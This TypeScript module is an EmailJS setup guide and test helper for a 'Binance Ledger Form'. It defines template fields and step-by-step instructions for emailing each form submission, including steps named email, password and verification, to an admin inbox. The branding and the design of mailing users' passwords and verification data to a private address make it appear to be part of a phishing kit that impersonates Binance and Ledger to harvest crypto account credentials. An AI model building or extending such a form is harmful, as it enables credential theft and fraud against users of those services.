
// EmailJS Setup Guide for Binance Ledger Form

export const EMAILJS_TEMPLATE_GUIDE = {
  templateParams: {
    step: "{{step}}", // The form step (email, password, verification, etc.)
    email: "{{email}}", // User's email address
    timestamp: "{{timestamp}}", // When the form was submitted
    data: "{{data}}", // JSON data from the form
    to_email: "{{to_email}}", // Admin email to receive notifications
    from_name: "{{from_name}}", // Name of the sender
    message: "{{message}}" // Summary message
  },
  
  sampleTemplate: `
    New form submission from Binance Ledger Form:
    
    Step: {{step}}
    User Email: {{email}}
    Timestamp: {{timestamp}}
    
    Data:
    {{data}}
    
    ---
    This email was sent automatically from the Binance Ledger verification system.
  `,
  
  setupInstructions: [
    "1. Go to https://www.emailjs.com/ and create an account",
    "2. Create a new email service (Gmail, Outlook, etc.)",
    "3. Create a new email template using the sample template above",
    "4. Use the template parameters listed in templateParams",
    "5. Update the EMAILJS_CONFIG in src/config/emailjs.config.ts with your actual IDs",
    "6. Replace 'admin@yourcompany.com' with your actual admin email in the form component"
  ]
};

// Test function to verify EmailJS integration
export const testEmailJS = async () => {
  try {
    const testData = {
      step: "test",
      email: "test@example.com",
      timestamp: new Date().toISOString(),
      data: JSON.stringify({ test: "EmailJS integration test" }, null, 2),
      to_email: "admin@yourcompany.com",
      from_name: "Binance Ledger Form Test",
      message: "This is a test email to verify EmailJS integration"
    };
    
    console.log("Test template params:", testData);
    return testData;
  } catch (error) {
    console.error("EmailJS test failed:", error);
    throw error;
  }
};
